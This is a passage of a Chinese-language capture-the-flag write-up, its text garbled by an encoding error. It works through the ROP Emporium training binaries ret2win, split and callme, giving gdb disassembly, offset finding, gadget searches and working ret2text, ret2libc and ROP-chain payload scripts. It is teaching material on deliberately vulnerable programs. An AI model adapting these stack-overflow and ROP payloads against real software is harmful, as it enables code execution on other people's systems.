   0x08048622 &lt;+44&gt;:    push   0x80487bc
   0x08048627 &lt;+49&gt;:    call   0x8048420 &lt;puts@plt&gt;
   0x0804862c &lt;+54&gt;:    add    esp,0x10
   0x0804862f &lt;+57&gt;:    sub    esp,0xc
   0x08048632 &lt;+60&gt;:    push   0x8048821
   0x08048637 &lt;+65&gt;:    call   0x8048400 &lt;printf@plt&gt;
   0x0804863c &lt;+70&gt;:    add    esp,0x10
   0x0804863f &lt;+73&gt;:    mov    eax,ds:0x804a060
   0x08048644 &lt;+78&gt;:    sub    esp,0x4
   0x08048647 &lt;+81&gt;:    push   eax
   0x08048648 &lt;+82&gt;:    push   0x32
   0x0804864a &lt;+84&gt;:    lea    eax,[ebp-0x28]
   0x0804864d &lt;+87&gt;:    push   eax
   0x0804864e &lt;+88&gt;:    call   0x8048410 &lt;fgets@plt&gt;
   0x08048653 &lt;+93&gt;:    add    esp,0x10
   0x08048656 &lt;+96&gt;:    nop
   0x08048657 &lt;+97&gt;:    leave  
   0x08048658 &lt;+98&gt;:    ret
End of assembler dump.
gdb-peda$ disassemble ret2win
Dump of assembler code for function ret2win:
   0x08048659 &lt;+0&gt;:     push   ebp
   0x0804865a &lt;+1&gt;:     mov    ebp,esp
   0x0804865c &lt;+3&gt;:     sub    esp,0x8
   0x0804865f &lt;+6&gt;:     sub    esp,0xc
   0x08048662 &lt;+9&gt;:     push   0x8048824
   0x08048667 &lt;+14&gt;:    call   0x8048400 &lt;printf@plt&gt;
   0x0804866c &lt;+19&gt;:    add    esp,0x10
   0x0804866f &lt;+22&gt;:    sub    esp,0xc
   0x08048672 &lt;+25&gt;:    push   0x8048841
   0x08048677 &lt;+30&gt;:    call   0x8048430 &lt;system@plt&gt;
   0x0804867c &lt;+35&gt;:    add    esp,0x10
   0x0804867f &lt;+38&gt;:    nop
   0x08048680 &lt;+39&gt;:    leave  
   0x08048681 &lt;+40&gt;:    ret
End of assembler dump.
</code></pre>
<p>å‡½æ•° <code>pwnme()</code> æ˜¯å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„å‡½æ•°ï¼Œå®ƒè°ƒç”¨ <code>fgets()</code> è¯»å–ä»»æ„æ•°æ®ï¼Œä½†ç¼“å†²åŒºçš„å¤§å°åªæœ‰ 40 å­—èŠ‚ï¼ˆ<code>0x0804864a &lt;+84&gt;: lea eax,[ebp-0x28]</code>ï¼Œ0x28=40ï¼‰ï¼Œå½“è¾“å…¥å¤§äºŽ 40 å­—èŠ‚çš„æ•°æ®æ—¶ï¼Œå°±å¯ä»¥è¦†ç›–æŽ‰è°ƒç”¨å‡½æ•°çš„ ebp å’Œè¿”å›žåœ°å€ï¼š</p>
<pre><code class="language-text">gdb-peda$ pattern_create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
Starting program: /home/firmy/Desktop/rop_emporium/ret2win32/ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

&gt; AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd5c0 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb&quot;)
EBX: 0x0
ECX: 0xffffd5c0 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb&quot;)
EDX: 0xf7f90860 --&gt; 0x0
ESI: 0xf7f8ee28 --&gt; 0x1d1d30
EDI: 0x0
EBP: 0x41304141 ('AA0A')
ESP: 0xffffd5f0 --&gt; 0xf7f80062 --&gt; 0x41000000 ('')
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffd5f0 --&gt; 0xf7f80062 --&gt; 0x41000000 ('')
0004| 0xffffd5f4 --&gt; 0xffffd610 --&gt; 0x1
0008| 0xffffd5f8 --&gt; 0x0
0012| 0xffffd5fc --&gt; 0xf7dd57c3 (&lt;__libc_start_main+243&gt;:       add    esp,0x10)
0016| 0xffffd600 --&gt; 0xf7f8ee28 --&gt; 0x1d1d30
0020| 0xffffd604 --&gt; 0xf7f8ee28 --&gt; 0x1d1d30
0024| 0xffffd608 --&gt; 0x0
0028| 0xffffd60c --&gt; 0xf7dd57c3 (&lt;__libc_start_main+243&gt;:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ pattern_offset $ebp
1093681473 found at offset: 40
gdb-peda$ pattern_offset $eip
1094796865 found at offset: 44
</code></pre>
<p>ç¼“å†²åŒºè·ç¦» ebp å’Œ eip çš„åç§»åˆ†åˆ«ä¸º 40 å’Œ 44ï¼Œè¿™å°±éªŒè¯äº†æˆ‘ä»¬çš„å‡è®¾ã€‚</p>
<p>é€šè¿‡æŸ¥çœ‹ç¨‹åºçš„é€»è¾‘ï¼Œè™½ç„¶æˆ‘ä»¬çŸ¥é“ .text æ®µä¸­å­˜åœ¨å‡½æ•° <code>ret2win()</code>ï¼Œä½†åœ¨ç¨‹åºæ‰§è¡Œä¸­å¹¶æ²¡æœ‰è°ƒç”¨åˆ°å®ƒï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯ç”¨è¯¥å‡½æ•°çš„åœ°å€è¦†ç›–è¿”å›žåœ°å€ï¼Œä½¿ç¨‹åºè·³è½¬åˆ°è¯¥å‡½æ•°ä¸­ï¼Œä»Žè€Œæ‰“å°å‡º flagï¼Œæˆ‘ä»¬ç§°è¿™ä¸€ç±»åž‹çš„ ROP ä¸º ret2textã€‚</p>
<p>è¿˜æœ‰ä¸€ä»¶é‡è¦çš„äº‹æƒ…æ˜¯ checksecï¼š</p>
<pre><code class="language-text">gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre>
<p>è¿™é‡Œå¼€å¯äº†å…³é—­äº† PIEï¼Œæ‰€ä»¥ .text çš„åŠ è½½åœ°å€æ˜¯ä¸å˜çš„ï¼Œå¯ä»¥ç›´æŽ¥ä½¿ç”¨ <code>ret2win()</code> çš„åœ°å€ <code>0x08048659</code>ã€‚</p>
<p>payload å¦‚ä¸‹ï¼ˆæ³¨è¿™ç¯‡æ–‡ç« ä¸­çš„paylaodæˆ‘ä¼šä½¿ç”¨å¤šç§æ–¹æ³•æ¥å†™ï¼Œä»¥å±•ç¤ºå„ç§å·¥å…·çš„ä½¿ç”¨ï¼‰ï¼š</p>
<pre><code class="language-text">$ python2 -c &quot;print 'A'*44 + '\x59\x86\x04\x08'&quot; | ./ret2win32
...
&gt; Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
</code></pre>
<h3 id="ret2win">ret2win</h3>
<p>çŽ°åœ¨æ˜¯ 64 ä½ç¨‹åºï¼š</p>
<pre><code class="language-text">gdb-peda$ disassemble pwnme
Dump of assembler code for function pwnme:
   0x00000000004007b5 &lt;+0&gt;:     push   rbp
   0x00000000004007b6 &lt;+1&gt;:     mov    rbp,rsp
   0x00000000004007b9 &lt;+4&gt;:     sub    rsp,0x20
   0x00000000004007bd &lt;+8&gt;:     lea    rax,[rbp-0x20]
   0x00000000004007c1 &lt;+12&gt;:    mov    edx,0x20
   0x00000000004007c6 &lt;+17&gt;:    mov    esi,0x0
   0x00000000004007cb &lt;+22&gt;:    mov    rdi,rax
   0x00000000004007ce &lt;+25&gt;:    call   0x400600 &lt;memset@plt&gt;
   0x00000000004007d3 &lt;+30&gt;:    mov    edi,0x4008f8
   0x00000000004007d8 &lt;+35&gt;:    call   0x4005d0 &lt;puts@plt&gt;
   0x00000000004007dd &lt;+40&gt;:    mov    edi,0x400978
   0x00000000004007e2 &lt;+45&gt;:    call   0x4005d0 &lt;puts@plt&gt;
   0x00000000004007e7 &lt;+50&gt;:    mov    edi,0x4009dd
   0x00000000004007ec &lt;+55&gt;:    mov    eax,0x0
   0x00000000004007f1 &lt;+60&gt;:    call   0x4005f0 &lt;printf@plt&gt;
   0x00000000004007f6 &lt;+65&gt;:    mov    rdx,QWORD PTR [rip+0x200873]        # 0x601070 &lt;stdin@@GLIBC_2.2.5&gt;
   0x00000000004007fd &lt;+72&gt;:    lea    rax,[rbp-0x20]
   0x0000000000400801 &lt;+76&gt;:    mov    esi,0x32
   0x0000000000400806 &lt;+81&gt;:    mov    rdi,rax
   0x0000000000400809 &lt;+84&gt;:    call   0x400620 &lt;fgets@plt&gt;
   0x000000000040080e &lt;+89&gt;:    nop
   0x000000000040080f &lt;+90&gt;:    leave  
   0x0000000000400810 &lt;+91&gt;:    ret
End of assembler dump.
gdb-peda$ disassemble ret2win
Dump of assembler code for function ret2win:
   0x0000000000400811 &lt;+0&gt;:     push   rbp
   0x0000000000400812 &lt;+1&gt;:     mov    rbp,rsp
   0x0000000000400815 &lt;+4&gt;:     mov    edi,0x4009e0
   0x000000000040081a &lt;+9&gt;:     mov    eax,0x0
   0x000000000040081f &lt;+14&gt;:    call   0x4005f0 &lt;printf@plt&gt;
   0x0000000000400824 &lt;+19&gt;:    mov    edi,0x4009fd
   0x0000000000400829 &lt;+24&gt;:    call   0x4005e0 &lt;system@plt&gt;
   0x000000000040082e &lt;+29&gt;:    nop
   0x000000000040082f &lt;+30&gt;:    pop    rbp
   0x0000000000400830 &lt;+31&gt;:    ret
End of assembler dump.
</code></pre>
<p>é¦–å…ˆä¸Ž 32 ä½ä¸åŒçš„æ˜¯å‚æ•°ä¼ é€’ï¼Œ64 ä½ç¨‹åºçš„å‰å…­ä¸ªå‚æ•°é€šè¿‡ RDIã€RSIã€RDXã€RCXã€R8 å’Œ R9 ä¼ é€’ã€‚æ‰€ä»¥ç¼“å†²åŒºå¤§å°å‚æ•°é€šè¿‡ rdi ä¼ é€’ç»™ <code>fgets()</code>ï¼Œå¤§å°ä¸º 32 å­—èŠ‚ã€‚</p>
<p>è€Œä¸”ç”±äºŽ ret çš„åœ°å€ä¸å­˜åœ¨ï¼Œç¨‹åºåœåœ¨äº† <code>=&gt; 0x400810 &lt;pwnme+91&gt;: ret</code> è¿™ä¸€æ­¥ï¼Œè¿™æ˜¯å› ä¸º 64 ä½å¯ä»¥ä½¿ç”¨çš„å†…å­˜åœ°å€ä¸èƒ½å¤§äºŽ <code>0x00007fffffffffff</code>ï¼Œå¦åˆ™å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p>
<pre><code class="language-text">gdb-peda$ r
Starting program: /home/firmy/Desktop/rop_emporium/ret2win/ret2win
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

&gt; AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe400 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb&quot;)
RBX: 0x0
RCX: 0x1f
RDX: 0x7ffff7dd4710 --&gt; 0x0
RSI: 0x7fffffffe400 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb&quot;)
RDI: 0x7fffffffe401 (&quot;AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb&quot;)
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffe428 (&quot;AA0AAFAAb&quot;)
RIP: 0x400810 (&lt;pwnme+91&gt;:      ret)
R8 : 0x0
R9 : 0x7ffff7fb94c0 (0x00007ffff7fb94c0)
R10: 0x602260 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n&quot;)
R11: 0x246
R12: 0x400650 (&lt;_start&gt;:        xor    ebp,ebp)
R13: 0x7fffffffe510 --&gt; 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400809 &lt;pwnme+84&gt;: call   0x400620 &lt;fgets@plt&gt;
   0x40080e &lt;pwnme+89&gt;: nop
   0x40080f &lt;pwnme+90&gt;: leave  
=&gt; 0x400810 &lt;pwnme+91&gt;: ret
   0x400811 &lt;ret2win&gt;:  push   rbp
   0x400812 &lt;ret2win+1&gt;:        mov    rbp,rsp
   0x400815 &lt;ret2win+4&gt;:        mov    edi,0x4009e0
   0x40081a &lt;ret2win+9&gt;:        mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe428 (&quot;AA0AAFAAb&quot;)
0008| 0x7fffffffe430 --&gt; 0x400062 --&gt; 0x1f8000000000000
0016| 0x7fffffffe438 --&gt; 0x7ffff7a41f6a (&lt;__libc_start_main+234&gt;:       mov    edi,eax)
0024| 0x7fffffffe440 --&gt; 0x0
0032| 0x7fffffffe448 --&gt; 0x7fffffffe518 --&gt; 0x7fffffffe870 (&quot;/home/firmy/Desktop/rop_emporium/ret2win/ret2win&quot;)
0040| 0x7fffffffe450 --&gt; 0x100000000
0048| 0x7fffffffe458 --&gt; 0x400746 (&lt;main&gt;:      push   rbp)
0056| 0x7fffffffe460 --&gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400810 in pwnme ()
gdb-peda$ pattern_offset $rbp
7007954260868540737 found at offset: 32
gdb-peda$ pattern_offset AA0AAFAAb
AA0AAFAAb found at offset: 40
</code></pre>
<p><code>re2win()</code> çš„åœ°å€ä¸º <code>0x0000000000400811</code>ï¼Œpayload å¦‚ä¸‹ï¼š</p>
<pre><code class="language-python">from zio import *

payload = &quot;A&quot;*40 + l64(0x0000000000400811)

io = zio('./ret2win')
io.writeline(payload)
io.read()
</code></pre>
<h3 id="split32">split32</h3>
<p>è¿™ä¸€é¢˜ä¹Ÿæ˜¯ ret2textï¼Œä½†è¿™ä¸€æ¬¡ï¼Œæˆ‘ä»¬æœ‰çš„æ˜¯ä¸€ä¸ª <code>usefulFunction()</code> å‡½æ•°ï¼š</p>
<pre><code class="language-text">gdb-peda$ disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x08048649 &lt;+0&gt;:     push   ebp
   0x0804864a &lt;+1&gt;:     mov    ebp,esp
   0x0804864c &lt;+3&gt;:     sub    esp,0x8
   0x0804864f &lt;+6&gt;:     sub    esp,0xc
   0x08048652 &lt;+9&gt;:     push   0x8048747
   0x08048657 &lt;+14&gt;:    call   0x8048430 &lt;system@plt&gt;
   0x0804865c &lt;+19&gt;:    add    esp,0x10
   0x0804865f &lt;+22&gt;:    nop
   0x08048660 &lt;+23&gt;:    leave  
   0x08048661 &lt;+24&gt;:    ret
End of assembler dump.
</code></pre>
<p>å®ƒè°ƒç”¨ <code>system()</code> å‡½æ•°ï¼Œè€Œæˆ‘ä»¬è¦åšçš„æ˜¯ç»™å®ƒä¼ é€’ä¸€ä¸ªå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‚æ•°åŽå¯ä»¥æ‰“å°å‡º flagã€‚</p>
<p>ä½¿ç”¨ radare2 ä¸­çš„å·¥å…· rabin2 åœ¨ <code>.data</code> æ®µä¸­æœç´¢å­—ç¬¦ä¸²ï¼š</p>
<pre><code class="language-text">$ rabin2 -z split32
...
vaddr=0x0804a030 paddr=0x00001030 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt
</code></pre>
<p>æˆ‘ä»¬å‘çŽ°å­˜åœ¨å­—ç¬¦ä¸² <code>/bin/cat flag.txt</code>ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œåœ°å€ä¸º <code>0x0804a030</code>ã€‚</p>
<p>ä¸‹é¢æž„é€  payloadï¼Œè¿™é‡Œå°±æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯ç›´æŽ¥ä½¿ç”¨è°ƒç”¨ <code>system()</code> å‡½æ•°çš„åœ°å€ <code>0x08048657</code>ï¼Œå¦ä¸€ç§æ˜¯ä½¿ç”¨ <code>system()</code> çš„ plt åœ°å€ <code>0x8048430</code>ï¼Œåœ¨å‰é¢çš„ç« èŠ‚ä¸­æˆ‘ä»¬å·²ç»çŸ¥é“äº† plt çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼ˆ1.5.6åŠ¨æ€é“¾æŽ¥ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬å†å›žé¡¾ä¸€ä¸‹ï¼š</p>
<p>ç»‘å®šå‰ï¼š</p>
<pre><code class="language-text">gdb-peda$ disassemble system
Dump of assembler code for function system@plt:
   0x08048430 &lt;+0&gt;:     jmp    DWORD PTR ds:0x804a018
   0x08048436 &lt;+6&gt;:     push   0x18
   0x0804843b &lt;+11&gt;:    jmp    0x80483f0
gdb-peda$ x/5x 0x804a018  
0x804a018:      0x08048436      0x08048446      0x08048456      0x08048466
0x804a028:      0x00000000
</code></pre>
<p>ç»‘å®šåŽï¼š</p>
<pre><code class="language-text">gdb-peda$ disassemble system
Dump of assembler code for function system:
   0xf7df9c50 &lt;+0&gt;:     sub    esp,0xc
   0xf7df9c53 &lt;+3&gt;:     mov    eax,DWORD PTR [esp+0x10]
   0xf7df9c57 &lt;+7&gt;:     call   0xf7ef32cd &lt;__x86.get_pc_thunk.dx&gt;
   0xf7df9c5c &lt;+12&gt;:    add    edx,0x1951cc
   0xf7df9c62 &lt;+18&gt;:    test   eax,eax
   0xf7df9c64 &lt;+20&gt;:    je     0xf7df9c70 &lt;system+32&gt;
   0xf7df9c66 &lt;+22&gt;:    add    esp,0xc
   0xf7df9c69 &lt;+25&gt;:    jmp    0xf7df9700 &lt;do_system&gt;
   0xf7df9c6e &lt;+30&gt;:    xchg   ax,ax
   0xf7df9c70 &lt;+32&gt;:    lea    eax,[edx-0x57616]
   0xf7df9c76 &lt;+38&gt;:    call   0xf7df9700 &lt;do_system&gt;
   0xf7df9c7b &lt;+43&gt;:    test   eax,eax
   0xf7df9c7d &lt;+45&gt;:    sete   al
   0xf7df9c80 &lt;+48&gt;:    add    esp,0xc
   0xf7df9c83 &lt;+51&gt;:    movzx  eax,al
   0xf7df9c86 &lt;+54&gt;:    ret
End of assembler dump.
gdb-peda$ x/5x 0x08048430
0x8048430 &lt;system@plt&gt;: 0xa01825ff      0x18680804      0xe9000000      0xffffffb0
0x8048440 &lt;__libc_start_main@plt&gt;:      0xa01c25ff
</code></pre>
<p>å…¶å®žè¿™é‡Œè®² plt ä¸æ˜¯å¾ˆç¡®åˆ‡ï¼Œå› ä¸º system ä½¿ç”¨å¤ªé¢‘ç¹ï¼Œåœ¨æˆ‘ä»¬ä½¿ç”¨å®ƒä¹‹å‰ï¼Œå®ƒå°±å·²ç»ç»‘å®šäº†ï¼Œåœ¨åŽé¢çš„æŒ‘æˆ˜ä¸­æˆ‘ä»¬ä¼šé‡åˆ°æ²¡æœ‰ç»‘å®šçš„æƒ…å†µã€‚</p>
<p>ä¸¤ç§ payload å¦‚ä¸‹ï¼š</p>
<pre><code class="language-text">$ python2 -c &quot;print 'A'*44 + '\x57\x86\x04\x08' + '\x30\xa0\x04\x08'&quot; | ./split32
...
&gt; ROPE{a_placeholder_32byte_flag!}
from zio import *

payload  = &quot;A&quot;*44
payload += l32(0x08048430)
payload += &quot;BBBB&quot;
payload += l32(0x0804a030)

io = zio('./split32')
io.writeline(payload)
io.read()
</code></pre>
<p>æ³¨æ„ "BBBB" æ˜¯æ–°çš„è¿”å›žåœ°å€ï¼Œå¦‚æžœå‡½æ•° retï¼Œå°±ä¼šæ‰§è¡Œ "BBBB" å¤„çš„æŒ‡ä»¤ï¼Œé€šå¸¸è¿™é‡Œä¼šæ”¾ç½®ä¸€äº› <code>pop;pop;ret</code> ä¹‹ç±»çš„æŒ‡ä»¤åœ°å€ï¼Œä»¥å¹³è¡¡å †æ ˆã€‚ä»Ž system() å‡½æ•°ä¸­ä¹Ÿèƒ½çœ‹å‡ºæ¥ï¼Œå®ƒçŽ°å°† esp å‡åŽ» 0xcï¼Œå†å–åœ°å€ esp+0x10 å¤„çš„æŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯ "BBBB" çš„åŽä¸€ä¸ªï¼Œå³å­—ç¬¦ä¸²çš„åœ°å€ã€‚å› ä¸º <code>system()</code> æ˜¯ libc ä¸­çš„å‡½æ•°ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•ç§°ä½œ ret2libcã€‚</p>
<h3 id="split">split</h3>
<pre><code class="language-text">$ rabin2 -z split
...
vaddr=0x00601060 paddr=0x00001060 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt
</code></pre>
<p>å­—ç¬¦ä¸²åœ°å€åœ¨ <code>0x00601060</code>ã€‚</p>
<pre><code class="language-text">gdb-peda$ disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400807 &lt;+0&gt;:     push   rbp
   0x0000000000400808 &lt;+1&gt;:     mov    rbp,rsp
   0x000000000040080b &lt;+4&gt;:     mov    edi,0x4008ff
   0x0000000000400810 &lt;+9&gt;:     call   0x4005e0 &lt;system@plt&gt;
   0x0000000000400815 &lt;+14&gt;:    nop
   0x0000000000400816 &lt;+15&gt;:    pop    rbp
   0x0000000000400817 &lt;+16&gt;:    ret
End of assembler dump.
</code></pre>
<p>64 ä½ç¨‹åºçš„ç¬¬ä¸€ä¸ªå‚æ•°é€šè¿‡ edi ä¼ é€’ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†è°ƒç”¨ä¸€ä¸ª gadgets æ¥å°†å­—ç¬¦ä¸²çš„åœ°å€å­˜è¿› ediã€‚</p>
<p>æˆ‘ä»¬å…ˆæ‰¾åˆ°éœ€è¦çš„ gadgetsï¼š</p>
<pre><code class="language-text">gdb-peda$ ropsearch &quot;pop rdi; ret&quot;
Searching for ROP gadget: 'pop rdi; ret' in: binary ranges
0x00400883 : (b'5fc3')  pop rdi; ret
</code></pre>
<p>ä¸‹é¢æ˜¯ payloadï¼š</p>
<pre><code class="language-text">$ python2 -c &quot;print 'A'*40 + '\x83\x08\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x10\x08\x40\x00\x00\x00\x00\x00'&quot; | ./split
...
&gt; ROPE{a_placeholder_32byte_flag!}
</code></pre>
<p>é‚£æˆ‘ä»¬æ˜¯å¦è¿˜å¯ä»¥ç”¨å‰é¢é‚£ç§æ–¹æ³•è°ƒç”¨ <code>system()</code> çš„ plt åœ°å€ <code>0x4005e0</code> å‘¢ï¼š</p>
<pre><code class="language-text">gdb-peda$ disassemble system
Dump of assembler code for function system:
   0x00007ffff7a63010 &lt;+0&gt;:     test   rdi,rdi
   0x00007ffff7a63013 &lt;+3&gt;:     je     0x7ffff7a63020 &lt;system+16&gt;
   0x00007ffff7a63015 &lt;+5&gt;:     jmp    0x7ffff7a62a70 &lt;do_system&gt;
   0x00007ffff7a6301a &lt;+10&gt;:    nop    WORD PTR [rax+rax*1+0x0]
   0x00007ffff7a63020 &lt;+16&gt;:    lea    rdi,[rip+0x138fd6]        # 0x7ffff7b9bffd
   0x00007ffff7a63027 &lt;+23&gt;:    sub    rsp,0x8
   0x00007ffff7a6302b &lt;+27&gt;:    call   0x7ffff7a62a70 &lt;do_system&gt;
   0x00007ffff7a63030 &lt;+32&gt;:    test   eax,eax
   0x00007ffff7a63032 &lt;+34&gt;:    sete   al
   0x00007ffff7a63035 &lt;+37&gt;:    add    rsp,0x8
   0x00007ffff7a63039 &lt;+41&gt;:    movzx  eax,al
   0x00007ffff7a6303c &lt;+44&gt;:    ret
End of assembler dump.
</code></pre>
<p>ä¾ç„¶å¯ä»¥ï¼Œå› ä¸ºå‚æ•°çš„ä¼ é€’æ²¡æœ‰ç”¨åˆ°æ ˆï¼Œæˆ‘ä»¬åªéœ€æŠŠåœ°å€ç›´æŽ¥æ›´æ”¹å°±å¯ä»¥äº†ï¼š</p>
<pre><code class="language-python">from zio import *

payload  = &quot;A&quot;*40
payload += l64(0x00400883)
payload += l64(0x00601060)
payload += l64(0x4005e0)

io = zio('./split')
io.writeline(payload)
io.read()
</code></pre>
<h3 id="callme32">callme32</h3>
<p>è¿™é‡Œæˆ‘ä»¬è¦æŽ¥è§¦çœŸæ­£çš„ plt äº†ï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼Œcallme32 ä»Žå…±äº«åº“ libcallme32.so ä¸­å¯¼å…¥ä¸‰ä¸ªç‰¹æ®Šçš„å‡½æ•°ï¼š</p>
<pre><code class="language-text">$ rabin2 -i callme32 | grep callme
ordinal=004 plt=0x080485b0 bind=GLOBAL type=FUNC name=callme_three
ordinal=005 plt=0x080485c0 bind=GLOBAL type=FUNC name=callme_one
ordinal=012 plt=0x08048620 bind=GLOBAL type=FUNC name=callme_two
</code></pre>
<p>æˆ‘ä»¬è¦åšçš„æ˜¯ä¾æ¬¡è°ƒç”¨ <code>callme_one()</code>ã€<code>callme_two()</code> å’Œ <code>callme_three()</code>ï¼Œå¹¶ä¸”æ¯ä¸ªå‡½æ•°éƒ½è¦ä¼ å…¥å‚æ•° <code>1</code>ã€<code>2</code>ã€<code>3</code>ã€‚é€šè¿‡è°ƒè¯•æˆ‘ä»¬èƒ½å¤ŸçŸ¥é“å‡½æ•°é€»è¾‘ï¼Œ<code>callme_one</code> ç”¨äºŽè¯»å…¥åŠ å¯†åŽçš„ flagï¼Œç„¶åŽä¾æ¬¡è°ƒç”¨ <code>callme_two</code> å’Œ <code>callme_three</code> è¿›è¡Œè§£å¯†ã€‚</p>
<p>ç”±äºŽå‡½æ•°å‚æ•°æ˜¯æ”¾åœ¨æ ˆä¸Šçš„ï¼Œä¸ºäº†å¹³è¡¡å †æ ˆï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª <code>pop;pop;pop;ret</code> çš„ gadgetsï¼š</p>
<pre><code class="language-text">$ objdump -d callme32 | grep -A 3 pop
...
 80488a8:       5b                      pop    %ebx
 80488a9:       5e                      pop    %esi
 80488aa:       5f                      pop    %edi
 80488ab:       5d                      pop    %ebp
 80488ac:       c3                      ret
 80488ad:       8d 76 00                lea    0x0(%esi),%esi
...
</code></pre>
<p>æˆ–è€…æ˜¯ <code>add esp, 8; pop; ret</code>ï¼Œåæ­£åªè¦èƒ½å¹³è¡¡ï¼Œéƒ½å¯ä»¥ï¼š</p>
<pre><code class="language-text">gdb-peda$ ropsearch &quot;add esp, 8&quot;
Searching for ROP gadget: 'add esp, 8' in: binary ranges
0x08048576 : (b'83c4085bc3')    add esp,0x8; pop ebx; ret
0x080488c3 : (b'83c4085bc3')    add esp,0x8; pop ebx; ret
</code></pre>
<p>æž„é€  payload å¦‚ä¸‹ï¼š</p>
<pre><code class="language-python">from zio import *

payload  = &quot;A&quot;*44

payload += l32(0x080485c0)
payload += l32(0x080488a9)
payload += l32(0x1) + l32(0x2) + l32(0x3)

payload += l32(0x08048620)
payload += l32(0x080488a9)
payload += l32(0x1) + l32(0x2) + l32(0x3)

payload += l32(0x080485b0)
payload += l32(0x080488a9)
payload += l32(0x1) + l32(0x2) + l32(0x3)

io = zio('./callme32')
io.writeline(payload)
io.read()
</code></pre>
<h3 id="callme">callme</h3>
<p>64 ä½ç¨‹åºä¸éœ€è¦å¹³è¡¡å †æ ˆäº†ï¼Œåªè¦å°†å‚æ•°æŒ‰é¡ºåºä¾æ¬¡æ”¾è¿›å¯„å­˜å™¨ä¸­å°±å¯ä»¥äº†ã€‚</p>
<pre><code class="language-text">$ rabin2 -i callme | grep callme
ordinal=004 plt=0x00401810 bind=GLOBAL type=FUNC name=callme_three
ordinal=008 plt=0x00401850 bind=GLOBAL type=FUNC name=callme_one
ordinal=011 plt=0x00401870 bind=GLOBAL type=FUNC name=callme_two
gdb-peda$ ropsearch &quot;pop rdi; pop rsi&quot;
Searching for ROP gadget: 'pop rdi; pop rsi' in: binary ranges
0x00401ab0 : (b'5f5e5ac3')      pop rdi; pop rsi; pop rdx; ret
</code></pre>
<p>payload å¦‚ä¸‹ï¼š</p>
<pre><code class="language-python">from zio import *

payload  = &quot;A&quot;*40

payload += l64(0x00401ab0)
payload += l64(0x1) + l64(0x2) + l64(0x3)
payload += l64(0x00401850)

payload += l64(0x00401ab0)
payload += l64(0x1) + l64(0x2) + l64(0x3)
payload += l64(0x00401870)

payload += l64(0x00401ab0)
payload += l64(0x1) + l64(0x2) + l64(0x3)
payload += l64(0x00401810)

io = zio('./callme')
io.writeline(payload)
io.read()
</code></pre>
<h3 id="write432">write432</h3>
